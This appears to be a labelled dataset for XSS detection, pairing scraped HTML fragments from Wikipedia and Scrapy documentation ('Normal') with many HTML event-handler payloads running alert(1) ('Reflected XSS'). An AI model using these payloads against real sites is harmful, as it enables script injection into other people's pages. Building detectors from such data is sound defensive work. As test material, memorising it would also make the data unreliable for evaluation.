Sentence,Final_Label
"	 </span> <span class=""reference-text""><cite class=""citation news"">Gibbs, Samuel (27 October 2014). <a rel=""nofollow"" class=""external text"" href=""https://www.theguardian.com/technology/2014/oct/27/elon-musk-artificial-intelligence-ai-biggest-existential-threat"">""Elon Musk: artificial intelligence is our biggest existential threat"" </a>. <i>The Guardian </i>. <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20151030054330/http://www.theguardian.com/technology/2014/oct/27/elon-musk-artificial-intelligence-ai-biggest-existential-threat"">Archived </a> from the original on 30 October 2015<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">30 October ",Normal
"<center draggable=""true"" ondragend=""alert(1)"">test</center>",Reflected XSS
"<select onmouseenter=""alert(1)"">test</select>",Reflected XSS
"<style>:target {color:red;}</style><shadow id=x style=""transition:color 1s"" ontransitionend=alert(1)></shadow>",Reflected XSS
<menuitem onblur=alert(1) tabindex=1 id=x></menuitem><input autofocus>,Reflected XSS
"<title draggable=""true"" ondragenter=""alert(1)"">test</title>",Reflected XSS
"<div draggable=""true"" contenteditable>drag me</div><bgsound ondrop=alert(1) contenteditable>drop here</bgsound>",Reflected XSS
"<div draggable=""true"" contenteditable>drag me</div><option ondragover=alert(1) contenteditable>drop here</option>",Reflected XSS
"<main onmousedown=""alert(1)"">test</main>",Reflected XSS
"<plaintext onmousemove=""alert(1)"">test</plaintext>",Reflected XSS
"<style>:target {color: red;}</style><dir id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></dir>",Reflected XSS
"<style>@keyframes slidein {}</style><option style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></option>",Reflected XSS
<dt onpointerout=alert(1)>XSS</dt>,Reflected XSS
<em onpointerleave=alert(1)>XSS</em>,Reflected XSS
"<li id=""cite_note-FOOTNOTERussellNorvig200318-34""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-FOOTNOTERussellNorvig200318_34-0"">^ </a> </b> ",Normal
<menuitem onfocusout=alert(1) tabindex=1 id=x></menuitem><input autofocus>,Reflected XSS
<img id=x tabindex=1 onbeforedeactivate=alert(1)></img><input autofocus>,Reflected XSS
<blockquote onpointerdown=alert(1)>XSS</blockquote>,Reflected XSS
"<style>@keyframes x{}</style><option style=""animation-name:x"" onanimationstart=""alert(1)""></option>",Reflected XSS
"<mark draggable=""true"" ondragend=""alert(1)"">test</mark>",Reflected XSS
"<style>:target {color:red;}</style><table id=x style=""transition:color 1s"" ontransitionend=alert(1)></table>",Reflected XSS
"<style>:target {transform: rotate(180deg);}</style><shadow id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></shadow>",Reflected XSS
<br onfocusout=alert(1) tabindex=1 id=x></br><input autofocus>,Reflected XSS
"<li><a href=""#CITEREFKahnemanSlovicTversky1982"">Kahneman, Slovic &amp; Tversky (1982) </a> have shown that people are terrible at elementary problems that involve uncertain reasoning. (See <a href=""/wiki/List_of_cognitive_biases"" title=""List of cognitive biases"">list of cognitive biases </a> for several examples). </li>",Normal
<basefont onfocusout=alert(1) tabindex=1 id=x></basefont><input autofocus>,Reflected XSS
"<div draggable=""true"" contenteditable>drag me</div><wbr ondragover=alert(1) contenteditable>drop here</wbr>",Reflected XSS
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=Bloomberg.com&amp;rft.atitle=Musk-Backed+Group+Probes+Risks+Behind+Artificial+Intelligence&amp;rft.aulast=Clark&amp;rft.aufirst=Jack&amp;rft_id=https%3A%2F%2Fwww.bloomberg.com%2Fnews%2Farticles%2F2015-07-01%2Fmusk-backed-group-probes-risks-behind-artificial-intelligence&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",Normal
"<isindex ondblclick=""alert(1)"">test</isindex>",Reflected XSS
"<strong draggable=""true"" ondragenter=""alert(1)"">test</strong>",Reflected XSS
"<div draggable=""true"" contenteditable>drag me</div><basefont ondragover=alert(1) contenteditable>drop here</basefont>",Reflected XSS
"<address draggable=""true"" ondrag=""alert(1)"">test</address>",Reflected XSS
"<caption onmouseleave=""alert(1)"">test</caption>",Reflected XSS
"<li><a href=""/wiki/Logic_programming"" title=""Logic programming"">Logic programming </a> </li>",Normal
"<style>@keyframes x{}</style><html style=""animation-name:x"" onanimationstart=""alert(1)""></html>",Reflected XSS
"<optgroup onmouseover=""alert(1)"">test</optgroup>",Reflected XSS
"<ol onmousedown=""alert(1)"">test</ol>",Reflected XSS
"<tbody draggable=""true"" ondragend=""alert(1)"">test</tbody>",Reflected XSS
"<frame onbeforecopy=""alert(1)"" contenteditable>test</frame>",Reflected XSS
<param onpointerenter=alert(1)>XSS</param>,Reflected XSS
"<style>@keyframes x{}</style><pre style=""animation-name:x"" onanimationend=""alert(1)""></pre>",Reflected XSS
"<style>:target {color:red;}</style><rb id=x style=""transition:color 1s"" ontransitionend=alert(1)></rb>",Reflected XSS
"<sup draggable=""true"" ondragstart=""alert(1)"">test</sup>",Reflected XSS
"<shadow onpaste=""alert(1)"" contenteditable>test</shadow>",Reflected XSS
"<button oncopy=""alert(1)"" contenteditable>test</button>",Reflected XSS
"<figure onkeypress=""alert(1)"" contenteditable>test</figure>",Reflected XSS
"<li><a href=""#CITEREFLugerStubblefield2004"">Luger &amp; Stubblefield 2004 </a>, pp.&#160;335–363, </li>",Normal
"<style>:target {transform: rotate(180deg);}</style><p id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></p>",Reflected XSS
"<code onbeforepaste=""alert(1)"" contenteditable>test</code>",Reflected XSS
"<plaintext onmouseleave=""alert(1)"">test</plaintext>",Reflected XSS
"<link rel=""alternate"" type=""application/x-wiki"" title=""Edit this page"" href=""/w/index.php?title=Artificial_intelligence&amp;action=edit""/>",Normal
"<basefont draggable=""true"" ondragleave=""alert(1)"">test</basefont>",Reflected XSS
<audio onpointerup=alert(1)>XSS</audio>,Reflected XSS
"<optgroup onbeforecopy=""alert(1)"" contenteditable>test</optgroup>",Reflected XSS
<image src/onerror=alert(1)>,Reflected XSS
"<li><a href=""/wiki/Fallibilism"" title=""Fallibilism"">Fallibilism </a> </li>",Normal
"<keygen ondblclick=""alert(1)"">test</keygen>",Reflected XSS
"<tt draggable=""true"" ondragstart=""alert(1)"">test</tt>",Reflected XSS
<listing onpointerenter=alert(1)>XSS</listing>,Reflected XSS
<area onpointerup=alert(1)>XSS</area>,Reflected XSS
"<li id=""cite_note-First-order_logic-198""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-First-order_logic_198-0"">^ </a> </b> ",Normal
<span onpointerleave=alert(1)>XSS</span>,Reflected XSS
"<style>@keyframes x{}</style><figcaption style=""animation-name:x"" onanimationend=""alert(1)""></figcaption>",Reflected XSS
<tfoot onpointerout=alert(1)>XSS</tfoot>,Reflected XSS
"<colgroup draggable=""true"" ondrag=""alert(1)"">test</colgroup>",Reflected XSS
"<dt oncopy=""alert(1)"" contenteditable>test</dt>",Reflected XSS
"<style draggable=""true"" ondragleave=""alert(1)"">test</style>",Reflected XSS
"<link onbeforecopy=""alert(1)"" contenteditable>test</link>",Reflected XSS
"<li><a href=""/wiki/Knowledge_representation_and_reasoning"" title=""Knowledge representation and reasoning"">Knowledge representation and reasoning </a> </li>",Normal
"<div draggable=""true"" contenteditable>drag me</div><spacer ondragover=alert(1) contenteditable>drop here</spacer>",Reflected XSS
<rb id=x tabindex=1 onactivate=alert(1)></rb>,Reflected XSS
"<abbr onkeyup=""alert(1)"" contenteditable>test</abbr>",Reflected XSS
"<strong onmouseup=""alert(1)"">test</strong>",Reflected XSS
"<div draggable=""true"" contenteditable>drag me</div><caption ondragover=alert(1) contenteditable>drop here</caption>",Reflected XSS
<select onfocusout=alert(1) id=x></select><input autofocus>,Reflected XSS
"<frameset oncopy=""alert(1)"" contenteditable>test</frameset>",Reflected XSS
" </p><p>In the long run, social skills and an understanding of human emotion and <a href=""/wiki/Game_theory"" title=""Game theory"">game theory </a> would be valuable to a social agent. Being able to predict the actions of others by understanding their motives and emotional states would allow an agent to make better decisions. Some computer systems mimic human emotion and expressions to appear more sensitive to the emotional dynamics of human interaction, or to otherwise facilitate <a href=""/wiki/Human%E2%80%93computer_interaction"" title=""Human–computer interaction"">human–computer interaction </a>.",Normal
"<template draggable=""true"" ondragenter=""alert(1)"">test</template>",Reflected XSS
<bdi onpointerdown=alert(1)>XSS</bdi>,Reflected XSS
"<style>:target {color: red;}</style><ins id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></ins>",Reflected XSS
<picture id=x tabindex=1 onbeforedeactivate=alert(1)></picture><input autofocus>,Reflected XSS
<plaintext onblur=alert(1) tabindex=1 id=x></plaintext><input autofocus>,Reflected XSS
"<div draggable=""true"" contenteditable>drag me</div><frameset ondrop=alert(1) contenteditable>drop here</frameset>",Reflected XSS
"<dl oncopy=""alert(1)"" contenteditable>test</dl>",Reflected XSS
"<frameset onpaste=""alert(1)"" contenteditable>test</frameset>",Reflected XSS
"<del onmousedown=""alert(1)"">test</del>",Reflected XSS
"<div id=""content"" class=""mw-body"" role=""main""> <a id=""top""></a>",Normal
"<section ondblclick=""alert(1)"">test</section>",Reflected XSS
<label id=x tabindex=1 onfocus=alert(1)></label>,Reflected XSS
"<style>:target {color: red;}</style><shadow id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></shadow>",Reflected XSS
"<address onmouseup=""alert(1)"">test</address>",Reflected XSS
"<li>Report bugs with Scrapy in our <a class=""reference external"" href=""https://github.com/scrapy/scrapy/issues"">issue tracker</a>.</li>",Normal
"AI research at <a href=""/wiki/University_of_Edinburgh"" title=""University of Edinburgh"">Edinburgh </a> and in France, birth of <a href=""/wiki/Prolog"" title=""Prolog"">Prolog </a>:",Normal
"<ruby onkeypress=""alert(1)"" contenteditable>test</ruby>",Reflected XSS
"<option onbeforecut=""alert(1)"" contenteditable>test</option>",Reflected XSS
<s onpointerenter=alert(1)>XSS</s>,Reflected XSS
"<li><a href=""/wiki/Gaussian_adaptation"" title=""Gaussian adaptation"">Gaussian adaptation </a> </li>",Normal
"		<h3  id=""p-navigation-label"">",Normal
"<option onbeforepaste=""alert(1)"" contenteditable>test</option>",Reflected XSS
"	 <div class=""plainlinks hlist navbar mini""><ul><li class=""nv-view""><a href=""/wiki/Template:Philosophy_of_science"" title=""Template:Philosophy of science""><abbr title=""View this template"" style="";;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">v </abbr> </a> </li><li class=""nv-talk""><a href=""/wiki/Template_talk:Philosophy_of_science"" title=""Template talk:Philosophy of science""><abbr title=""Discuss this template"" style="";;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">t </abbr> </a> </li><li class=""nv-edit""><a class=""external text"" href=""https://en.wikipedia.org/w/index.php?title=Template:Philosophy_of_science&amp;action=edit""><abbr title=""Edit this template"" style="";;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">e </abbr> </a> </li> </ul> </div>",Normal
"<style>@keyframes x{}</style><rp style=""animation-name:x"" onanimationstart=""alert(1)""></rp>",Reflected XSS
"<em draggable=""true"" ondragend=""alert(1)"">test</em>",Reflected XSS
<dt id=x tabindex=1 ondeactivate=alert(1)></dt><input id=y autofocus>,Reflected XSS
"<div draggable=""true"" contenteditable>drag me</div><template ondragover=alert(1) contenteditable>drop here</template>",Reflected XSS
<blink onpointerover=alert(1)>XSS</blink>,Reflected XSS
"<ul><li><a href=""/wiki/Nick_Bostrom"" title=""Nick Bostrom"">Nick Bostrom </a> </li>",Normal
"<hgroup draggable=""true"" ondragend=""alert(1)"">test</hgroup>",Reflected XSS
<body onscroll=alert(1)><div style=height:1000px></div><div id=x></div>,Reflected XSS
"<li><a href=""/wiki/Margaret_Mead"" title=""Margaret Mead"">Margaret Mead </a> </li>",Normal
<pre onpointerup=alert(1)>XSS</pre>,Reflected XSS
"<multicol onbeforecopy=""alert(1)"" contenteditable>test</multicol>",Reflected XSS
<section onpointerup=alert(1)>XSS</section>,Reflected XSS
"<audio oncontextmenu=""alert(1)"">test</audio>",Reflected XSS
"<sub draggable=""true"" ondragstart=""alert(1)"">test</sub>",Reflected XSS
"<samp draggable=""true"" ondrag=""alert(1)"">test</samp>",Reflected XSS
"<aside onpaste=""alert(1)"" contenteditable>test</aside>",Reflected XSS
"<hr onbeforecopy=""alert(1)"" contenteditable>test</hr>",Reflected XSS
      <hr/>,Normal
AI becomes hugely successful in the early 21st century,Normal
"<applet onmouseout=""alert(1)"">test</applet>",Reflected XSS
"<body onbeforepaste=""alert(1)"" contenteditable>test</body>",Reflected XSS
"<div draggable=""true"" contenteditable>drag me</div><listing ondrop=alert(1) contenteditable>drop here</listing>",Reflected XSS
<form onfocusout=alert(1) tabindex=1 id=x></form><input autofocus>,Reflected XSS
"<samp onkeyup=""alert(1)"" contenteditable>test</samp>",Reflected XSS
"<command draggable=""true"" ondrag=""alert(1)"">test</command>",Reflected XSS
"<li><a href=""/wiki/Entertainment_robot"" title=""Entertainment robot"">Entertainment </a> </li>",Normal
"<section onmousemove=""alert(1)"">test</section>",Reflected XSS
"<img oncontextmenu=""alert(1)"">test</img>",Reflected XSS
"<style>:target {transform: rotate(180deg);}</style><form id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></form>",Reflected XSS
<isindex onpointerenter=alert(1)>XSS</isindex>,Reflected XSS
"<style>@keyframes x{}</style><hr style=""animation-name:x"" onanimationstart=""alert(1)""></hr>",Reflected XSS
<dir id=x tabindex=1 onfocusin=alert(1)></dir>,Reflected XSS
<p>Having trouble? We’d like to help!</p>,Normal
<cite onfocusout=alert(1) tabindex=1 id=x></cite><input autofocus>,Reflected XSS
<input type=radio id=x onfocus=alert(1)>,Reflected XSS
"	 </span> <span class=""reference-text""><cite class=""citation web"">Jeff Larson, Julia Angwin (23 May 2016). <a rel=""nofollow"" class=""external text"" href=""https://www.propublica.org/article/how-we-analyzed-the-compas-recidivism-algorithm"">""How We Analyzed the COMPAS Recidivism Algorithm"" </a>. <i>ProPublica </i><span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">23 July ",Normal
"<style>@keyframes x{}</style><ol style=""animation-name:x"" onanimationend=""alert(1)""></ol>",Reflected XSS
"<q oncut=""alert(1)"" contenteditable>test</q>",Reflected XSS
"<li id=""cite_note-375""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-375"">^ </a> </b> ",Normal
"<shadow onmouseout=""alert(1)"">test</shadow>",Reflected XSS
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><nav id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></nav>",Reflected XSS
"<element draggable=""true"" ondragenter=""alert(1)"">test</element>",Reflected XSS
"<bdi oncontextmenu=""alert(1)"">test</bdi>",Reflected XSS
"<tbody oncontextmenu=""alert(1)"">test</tbody>",Reflected XSS
"<li><a href=""/wiki/Prolog"" title=""Prolog"">Prolog </a><span class=""nowrap"">&#160; ",Normal
<option onpointerover=alert(1)>XSS</option>,Reflected XSS
"<div draggable=""true"" contenteditable>drag me</div><template ondrop=alert(1) contenteditable>drop here</template>",Reflected XSS
"<li class=""toctree-l1""><a class=""reference internal"" href=""intro/tutorial.html"">Scrapy Tutorial</a></li>",Normal
<caption onpointerup=alert(1)>XSS</caption>,Reflected XSS
"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=29"" title=""Edit section: Probabilistic methods for uncertain reasoning"">edit </a><span class=""mw-editsection-bracket"">] ",Normal
"<map onbeforepaste=""alert(1)"" contenteditable>test</map>",Reflected XSS
"<plaintext draggable=""true"" ondragenter=""alert(1)"">test</plaintext>",Reflected XSS
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=McKinsey+%26+Company&amp;rft.atitle=Advanced+analytics+in+hospitality&amp;rft.date=2017&amp;rft_id=https%3A%2F%2Fwww.mckinsey.com%2Fbusiness-functions%2Fmckinsey-digital%2Four-insights%2Fadvanced-analytics-in-hospitality&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",Normal
<area onpointerdown=alert(1)>XSS</area>,Reflected XSS
"	 </span> <span class=""reference-text""><cite class=""citation journal"">Samuel, A. L. (July 1959). ""Some Studies in Machine Learning Using the Game of Checkers"". <i>IBM Journal of Research and Development </i>. <b>3 </b> (3): 210–229. <a href=""/wiki/CiteSeerX"" title=""CiteSeerX"">CiteSeerX </a>&#160;<span class=""cs1-lock-free"" title=""Freely accessible""><a rel=""nofollow"" class=""external text"" href=""//citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.368.2254"">10.1.1.368.2254 </a> ",Normal
"        <div class=""wy-menu wy-menu-vertical"" data-spy=""affix"" role=""navigation"" aria-label=""main navigation"">",Normal
"<sub onmousemove=""alert(1)"">test</sub>",Reflected XSS
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dt id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></dt>",Reflected XSS
"<style>@keyframes x{}</style><th style=""animation-name:x"" onanimationstart=""alert(1)""></th>",Reflected XSS
"<tr oncut=""alert(1)"" contenteditable>test</tr>",Reflected XSS
"       <div class=""rst-content"">",Normal
"<style>@keyframes slidein {}</style><samp style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></samp>",Reflected XSS
